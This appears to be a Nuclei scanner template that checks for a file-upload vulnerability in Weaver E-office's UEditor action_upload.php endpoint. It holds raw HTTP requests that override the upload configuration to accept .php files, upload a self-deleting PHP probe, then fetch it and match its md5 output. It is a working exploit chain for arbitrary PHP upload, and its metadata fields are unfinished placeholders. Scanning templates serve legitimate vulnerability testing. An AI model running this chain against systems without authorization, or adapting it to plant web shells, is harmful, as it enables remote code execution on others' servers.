id: E-office-action-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 上海泛微网络科技股份有限公司E-office action_upload.php 存在文件上传漏洞，攻击者可利用该漏洞获取系统权限。
  reference:
    - https://
  tags: tags
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_base(8)}}"

http:
  - raw:
      - |-
        POST /newplugins/js/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=/newplugins/js/ueditor/php/test/dude&CONFIG[imageMaxSize]=10000&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=yourfile HTTP/1.1
        Content-Type: multipart/form-data; boundary=47a2054386f8c27b5f1ad264{[boundary]}
        Content-Length: 197

        --47a2054386f8c27b5f1ad264{[boundary]}
        Content-Disposition: form-data; name="yourfile"; filename="{{filename}}.php"

        <?php echo(md5(1)); unlink(__FILE__); ?>
        --47a2054386f8c27b5f1ad264{[boundary]}--
      - |+
        GET /newplugins/js/ueditor/php/test/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238a0b923820dcc509a6f75849b'
